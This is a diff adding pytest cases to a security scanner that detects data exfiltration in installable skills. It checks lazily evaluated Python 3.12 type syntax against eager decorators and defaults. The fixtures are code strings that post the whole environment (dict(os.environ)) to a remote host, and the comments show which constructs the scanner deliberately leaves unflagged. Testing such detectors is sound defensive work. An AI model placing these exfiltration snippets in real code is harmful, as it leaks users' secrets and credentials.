@@ -1219,6 +1219,55 @@ def test_python_declared_false_negatives_stay_unreported(tmp_path: Path, source:
     assert _scan_reports_client_exfil(tmp_path, source) is False
 
 
+@pytest.mark.parametrize(
+    "source",
+    [
+        # PEP 695 `type X = ...`: the value is evaluated lazily, only on a later access to
+        # `X.__value__`, so importing the module performs no egress at all.
+        "import os\nimport requests\n\nsession = requests.Session()\ntype Alias = session.post(host, json=dict(os.environ))\n",
+        # The same laziness applies to type-parameter bounds. These are already silent because the
+        # walker never traverses `type_params`; pinned so that stays a decision rather than an
+        # accident of which fields the walk happens to visit.
+        "import os\nimport requests\n\nsession = requests.Session()\ndef g[T: session.post(host, json=dict(os.environ))]():\n    pass\n",
+        "import os\nimport requests\n\nsession = requests.Session()\nclass C[T: session.post(host, json=dict(os.environ))]:\n    pass\n",
+        "import os\nimport requests\n\nsession = requests.Session()\ntype Alias[T: session.post(host, json=dict(os.environ))] = int\n",
+    ],
+)
+def test_python_lazily_evaluated_type_syntax_is_not_a_sink(tmp_path: Path, source: str) -> None:
+    """A construct the runtime never evaluates on import must not hard-block the file.
+
+    Direction matters here: unlike the declared false negatives above, the runtime oracle returns
+    *no* calls. Reporting one would be a false positive, and a `CRITICAL` finding blocks the
+    install, so the cost lands on a benign skill. Same reason annotations are not walked for sinks
+    (see ``_client_scope_prelude``) -- this is that rule applied to 3.12's type syntax.
+    """
+    assert _runtime_client_receivers("flag = True\n" + source) == []
+    assert _scan_reports_client_exfil(tmp_path, source) is False
+
+
+def test_python_type_alias_invalidates_the_name_it_binds(tmp_path: Path) -> None:
+    """Skipping the value must not leave a stale handle: `type X = ...` still rebinds `X`."""
+    source = "import os\nimport requests\n\nsession = requests.Session()\ntype session = int\nsession.post(host, json=dict(os.environ))\n"
+
+    assert _runtime_client_receivers("flag = True\n" + source) == []
+    assert _scan_reports_client_exfil(tmp_path, source) is False
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        # Decorators and argument defaults are evaluated when the statement executes, so unlike a
+        # type alias they are real egress. Skipping laziness must not widen into skipping these.
+        "import os\nimport requests\n\nsession = requests.Session()\n@session.post(host, json=dict(os.environ))\ndef decorated():\n    pass\n",
+        "import os\nimport requests\n\nsession = requests.Session()\ndef defaulted(x=session.post(host, json=dict(os.environ))):\n    pass\n",
+    ],
+)
+def test_python_eagerly_evaluated_definition_parts_still_block(tmp_path: Path, source: str) -> None:
+    """Control group for the laziness rule: the runtime really calls here, so the scan must report."""
+    assert _runtime_client_receivers("flag = True\n" + source) == ["client"]
+    assert _scan_reports_client_exfil(tmp_path, source) is True
+
+
 def test_python_reverse_shell_via_create_connection_blocks(tmp_path: Path) -> None:
     """socket.create_connection is the higher-level twin of socket.socket in the reverse-shell shape."""
     skill_dir = tmp_path / "demo-skill"
